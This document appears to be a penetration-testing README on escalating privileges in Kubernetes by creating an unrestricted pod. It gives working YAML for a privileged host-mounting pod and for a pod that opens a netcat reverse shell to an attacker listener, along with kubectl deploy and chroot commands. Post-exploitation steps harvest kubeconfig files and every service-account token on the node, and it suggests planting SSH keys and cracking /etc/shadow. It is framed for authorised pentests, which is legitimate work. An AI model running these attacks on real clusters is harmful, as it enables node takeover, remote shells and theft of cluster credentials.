# You can create a pod with all the things
If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides multiple potential paths to cluster-admin. 

The pod you create mounts the host's filesystem to the pod. You then exec into your pod and chroot to the directory where you mounted the host's filesystem. You now have root on the node running your pod. One promising privesc path is available if you can schedule your pod to run on the control-plane node using the nodeName selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  

# Pod Creation

## Create a pod you can exec into
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-everything-allowed
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
  volumes:
  - name: noderoot
    hostPath:
      path: /
```
[pod-everything-allowed.yaml](pod-everything-allowed.yaml)

#### Option 1: Create pod from local yaml 
```bash
kubectl apply -f pod-everything-allowed.yaml 
```

#### Option 2: Create pod from github hosted yaml
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/everything-allowed/pod-everything-allowed.yaml 
```

#### Exec into pod 
```bash
kubectl exec -it pod-everything-allowed -- chroot /host
```

## Or, create a reverse shell pod
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-everything-allowed-revshell
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-revshell
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
  volumes:
  - name: noderoot
    hostPath:
      path: /
```
[pod-everything-allowed-revshell.yaml](pod-everything-allowed-revshell.yaml)

#### Set up listener
```bash
nc -nvlp 3116
```

#### Create the pod
```bash
# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
```

#### Catch the shell and chroot to /host 
```bash
~ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
~ chroot /host
```

# Post exploitation

You now have root access to the node. Here are some next steps: 

#### Look for kubeconfig's in the host filesystem 
If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)

```bash
find / -name kubeconfig
```
```
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/merged/var/lib/kube-proxy/kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/var/lib/node-problem-detector/kubeconfig
/var/lib/kubelet/kubeconfig
/var/lib/kube-proxy/kubeconfig
/home/kubernetes/containerized_mounter/rootfs/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/mnt/stateful_partition/var/lib/node-problem-detector/kubeconfig
/mnt/stateful_partition/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
```

#### Grab all tokens from all pods on the system
Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system

```bash
# This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort

default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/calico-node-token-d426t/token


# For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
DTOKEN=`cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions

# Does the token allow you to view secrets in that namespace? How about other namespaces?
# Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
```

#### Some other ideas:
* Add your public key authorized_keys on the node and ssh to it
* Crack passwords in /etc/shadow, see if you can use them to access control-plane nodes
* Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 

#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test. 

   
# Reference(s): 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
  
